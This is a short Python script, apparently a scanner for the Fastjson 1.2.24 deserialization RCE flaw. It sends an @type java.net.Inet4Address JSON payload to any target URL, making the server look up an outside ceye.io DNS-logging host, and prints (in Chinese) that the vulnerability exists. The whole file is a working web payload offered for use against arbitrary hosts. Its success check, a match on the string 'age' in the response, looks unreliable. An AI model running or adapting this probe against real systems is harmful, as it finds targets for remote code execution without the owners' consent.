import requests
def connect(ip):
    url=ip
    headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0',
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
             'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
             'Accept-Encoding': 'gzip, deflate',
             'DNT': '1',
             'Content-Type': 'application/json',
             'Connection': 'close',
             'Content-Length': '64'}
    data='{"zeo":{"@type":"java.net.Inet4Address","val":"s4i644.ceye.io"}}'
    res=requests.post(url=url,headers=headers,data=data)
    # print(res.text)
    if 'age' in res.text:
        print('存在Fastjson1.2.24-RCE漏洞！')